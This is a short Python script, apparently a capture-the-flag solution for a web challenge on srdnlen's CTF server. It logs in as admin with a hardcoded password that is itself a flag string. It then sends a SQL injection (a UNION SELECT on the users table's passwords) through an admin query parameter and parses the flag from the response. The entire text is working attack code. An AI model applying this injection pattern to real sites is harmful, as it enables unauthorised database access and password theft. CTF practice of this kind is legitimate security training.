import requests
import re
URL = 'spongeweb.challs.srdnlen.it'

session = requests.Session()
def login():
    r = session.post(f'http://{URL}/login', data={'username':'admin' , 'password':'srdnlen{XSSS_cr0Ss_S1T3_sP0nG3wEb_SQLi}'})
    return r.cookies

def exploit():
    payload = f'http://{URL}/admin?query=users+union+select+password+from+users'
    r = session.get(payload)
    return r.text

cookies = login()
response = exploit()
flag = re.search("srdnlen{(.*)}", response).group(0)
print(flag)